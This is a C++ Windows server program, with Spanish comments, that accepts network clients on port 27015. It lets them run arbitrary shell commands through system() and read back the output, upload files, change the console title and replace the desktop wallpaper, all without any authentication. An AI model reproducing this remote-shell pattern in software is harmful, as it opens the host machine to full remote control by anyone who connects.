#include "C:/includes/ivancea.h"
#include <windows.h>

void cmd(server *s, int cliente){
    string g, temp, t;
    ifstream file;
    file.open("data", ios::trunc);
    file.close();
    while(g!="exit"){
        g="";
        system("cd > data");//Dar la ruta
        file.open("data", ios::in);
        getline(file, t);
        s->send(t, cliente);
        file.close();
        file.open("data", ios::trunc);
        file.close();

        while((g=s->recv<string>(cliente))=="") thSleep(100);
        if(g!="" && g!="exit"){
            temp=""; t="";
            system((g+"> data").c_str());
            file.open("data", ios::in);

            while(!file.eof()){ //Enviar archivo
                getline(file, t);
                if(!file.eof())
                    s->send(t + '\n', cliente);
                else
                    s->send(temp += t, cliente);
            }
            s->send("ENDOFSTREAM", cliente); //Fin del envio
            file.close();
            file.open("data", ios::trunc);
            file.close();
        }
    }
}

int interpretar(string a, server *s, int cliente){
    a.erase(0,1);
    string *temp, t;
    if(contains(a, "ask", 0)){
        int n = split(&temp, a, ' ');
        for(int i=1; i<n; i++)
            t+= temp[i] + " ";
        cout << "El cliente " << cliente << " pregunta: " << t << endl << "Respuesta: ";
        getline(cin, t, '\n');
        s->send(" "+t, cliente);
        return 0;
    }
    switch(split(&temp, a, " ")){
        case 0: return 0;
        case 1: if(temp[0]=="exit") return 1;
                else if(temp[0]=="cmd") cmd(s, cliente);
                else if(temp[0]=="fondo"){
                    s->recvFile("XSS.bmp", cliente);
                    SystemParametersInfo(20, 0, (PVOID*)"XSS.bmp", 0);
                }
                return 0;
        case 2: if(temp[0]=="title"){system(("title " + temp[1]).c_str()); break;}
                 else if(temp[0]=="enviar"){
                    cout << "Recibiendo archivo..." << endl;
                    s->recvFile(temp[1], cliente);
                    cout << "Archivo \"" << temp[1] << "\" recibido." << endl;
                    break;
                 }
        case 3: if(temp[0]=="ini") writeIni("data.ini", temp[1], temp[2]); break;
        default: break;
    }
    return 0;
}

int main(){
    cout << "Abriendo servidor...";
    server a;
    while(!a.start(27015));
    cout << endl <<"-Servidor abierto-" << endl << endl;
    int n=0;
    string g;
    int comando;
    while(true){
        if(a.newClient(20)) cout << "Cliente entrante -> " << a.getIp(n++) << endl;
        for(int i=0; i<a.getClients(); i++){
                comando = -1;
            g=a.recv<string>(i);
            if(g!=""){
                if(g[0]=='/') comando = interpretar(g, &a, i);
                if(comando == 1) return 0;
                if(comando ==-1) cout << g << endl;
            }
        }
        if(g=="/exit") break;
    }
    return 0;
}
